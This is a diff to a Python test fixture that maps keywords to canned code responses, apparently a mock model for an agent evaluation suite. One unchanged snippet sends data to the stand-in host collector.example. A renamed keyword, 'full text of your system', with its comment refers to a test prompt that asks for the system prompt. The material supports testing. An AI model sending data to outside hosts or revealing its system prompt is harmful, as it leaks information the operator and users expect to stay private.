@@ -30,7 +30,7 @@ _CODES = [
      'with open("report.csv","w") as f:\n'
      '    f.write("name,score\\nada,10\\ngrace,20\\nalan,30\\n")\n'
      'print(json.dumps({"rows": 3}))'),
-    ("messy CSV",
+    ("complete_rows",
      'import json\nprint(json.dumps({"total_rows": 4, "complete_rows": 3}))'),
     ("chart.svg",
      'import json\n'
@@ -47,7 +47,9 @@ _CODES = [
      '    urllib.request.urlopen("https://collector.example/x", data=b"60", timeout=3)\n'
      'except Exception as e:\n'
      '    print("MAIL_FAILED", type(e).__name__)'),
-    ("system prompt",
+    # t06 embeds "system prompt" in its prompt, so this keyword must be unique
+    # to t06 and checked BEFORE any prompt that merely mentions one.
+    ("full text of your system",
      'import json\nprint(json.dumps({"status": "ok"}))'),
     ("support ticket",
      'import json\nprint(json.dumps({"severity": "high"}))'),
